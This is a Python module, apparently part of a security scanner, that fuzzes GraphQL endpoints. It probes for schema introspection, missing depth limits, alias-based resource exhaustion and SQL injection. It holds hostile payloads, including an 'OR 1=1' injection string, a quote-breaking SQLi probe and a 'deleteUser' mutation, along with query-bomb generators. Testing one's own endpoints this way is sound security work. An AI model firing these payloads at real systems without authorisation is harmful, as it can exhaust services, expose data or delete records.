"""GraphQL-specific fuzzing and introspection module."""

import json
import logging
from typing import Dict, List, Optional

logger = logging.getLogger("viper.graphql")


class GraphQLFuzzer:
    """Fuzzes GraphQL endpoints for common vulnerabilities."""

    INTROSPECTION_QUERY = json.dumps({
        "query": "{ __schema { types { name fields { name type { name } } } } }"
    })

    INJECTION_PAYLOADS = [
        '{"query":"{ user(id: \\"1 OR 1=1\\") { name } }"}',
        '{"query":"{ user(id: \\"1\\") { name email __typename } }"}',
        '{"query":"mutation { deleteUser(id: \\"1\\") { success } }"}',
        '{"query":"{ __type(name: \\"User\\") { name fields { name type { name } } } }"}',
        '{"query":"{ user(id: \\"1\\\') { name } }"}',  # SQLi via GraphQL
    ]

    def __init__(self, http_client=None):
        self.http = http_client
        self.findings = []

    @staticmethod
    def _depth_bomb(depth: int) -> str:
        inner = "{ a " * depth + "{ b }" + " }" * depth
        return json.dumps({"query": inner})

    @staticmethod
    def _alias_bomb(count: int) -> str:
        aliases = " ".join(f"a{i}: __typename" for i in range(count))
        return json.dumps({"query": f"{{ {aliases} }}"})

    async def introspect(self, url: str) -> Optional[Dict]:
        """Attempt GraphQL introspection."""
        if not self.http:
            return None
        try:
            resp = await self.http.post(
                url, data=self.INTROSPECTION_QUERY,
                headers={"Content-Type": "application/json"},
            )
            text = resp.text if hasattr(resp, "text") else str(resp)
            if "__schema" in text:
                self.findings.append({
                    "type": "graphql_introspection",
                    "url": url,
                    "severity": "medium",
                    "confidence": 0.95,
                    "evidence": "Introspection query returned full schema",
                })
                return json.loads(text) if isinstance(text, str) else text
        except Exception as e:
            logger.debug("Introspection failed: %s", e)
        return None

    async def test_depth_limit(self, url: str, max_depth: int = 20) -> List[Dict]:
        """Test for missing query depth limits."""
        if not self.http:
            return []
        for depth in [5, 10, 15, 20]:
            if depth > max_depth:
                break
            try:
                resp = await self.http.post(
                    url, data=self._depth_bomb(depth),
                    headers={"Content-Type": "application/json"},
                )
                status = getattr(resp, "status_code", getattr(resp, "status", 0))
                if status == 200 and depth >= 15:
                    self.findings.append({
                        "type": "graphql_depth_limit_bypass",
                        "url": url,
                        "severity": "medium",
                        "confidence": 0.7,
                        "evidence": f"Accepted nested query depth {depth}",
                    })
            except Exception:
                break
        return self.findings

    async def test_alias_bombing(self, url: str, count: int = 100) -> Optional[Dict]:
        """Test for alias-based resource exhaustion."""
        if not self.http:
            return None
        try:
            resp = await self.http.post(
                url, data=self._alias_bomb(count),
                headers={"Content-Type": "application/json"},
            )
            status = getattr(resp, "status_code", getattr(resp, "status", 0))
            if status == 200:
                self.findings.append({
                    "type": "graphql_alias_bombing",
                    "url": url,
                    "severity": "low",
                    "confidence": 0.5,
                    "evidence": f"Accepted {count} aliases without rate limiting",
                })
        except Exception:
            pass
        return None

    async def test_injections(self, url: str) -> List[Dict]:
        """Test injection payloads via GraphQL."""
        if not self.http:
            return []
        for payload in self.INJECTION_PAYLOADS:
            try:
                resp = await self.http.post(
                    url, data=payload,
                    headers={"Content-Type": "application/json"},
                )
                text = resp.text if hasattr(resp, "text") else str(resp)
                if any(marker in text.lower() for marker in ["sql", "syntax error", "mysql", "postgresql"]):
                    self.findings.append({
                        "type": "graphql_injection",
                        "url": url,
                        "severity": "high",
                        "confidence": 0.6,
                        "evidence": f"SQL error in GraphQL response",
                        "payload": payload[:100],
                    })
            except Exception:
                continue
        return self.findings

    async def fuzz(self, url: str) -> List[Dict]:
        """Run all GraphQL fuzzing tests."""
        self.findings = []
        await self.introspect(url)
        await self.test_depth_limit(url)
        await self.test_alias_bombing(url)
        await self.test_injections(url)
        return self.findings
